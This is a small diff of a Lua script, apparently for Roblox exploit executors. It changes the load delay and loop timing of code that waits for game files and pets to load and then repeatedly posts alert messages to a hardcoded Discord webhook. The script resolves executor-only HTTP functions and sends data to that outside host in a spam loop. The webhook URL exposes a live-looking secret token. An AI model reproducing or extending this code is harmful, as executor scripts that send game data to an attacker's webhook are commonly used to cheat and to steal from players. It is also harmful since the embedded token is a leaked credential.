@@ -1,7 +1,7 @@
 local webhook_url = "https://discord.com/api/webhooks/1523914403907371099/48Y1f7Mh3yPWLr6T_VpGrvZpJ9PWTjhNf6dFrixzQ1ZWJbMd1rtkqBmsPX-iEzIsymKW"
 
 -- CONFIGURATION
-local LOAD_DELAY = 7 -- Time (in seconds) allowed for game files and pets to load into the server.
+local LOAD_DELAY = 3 -- Time (in seconds) allowed for game files and pets to load into the server.
 
 -- Universal request resolver for mobile/PC executors
 local requestFunction = request or http_request or (syn and syn.request) or HttpPost
@@ -102,7 +102,7 @@ local function triggerAlertSpam(initialText)
     task.spawn(function()
         while alertLoopActive do
             sendToDiscord(alertMessage)
-            task.wait(2)
+            task.wait(4)
         end
     end)
 end
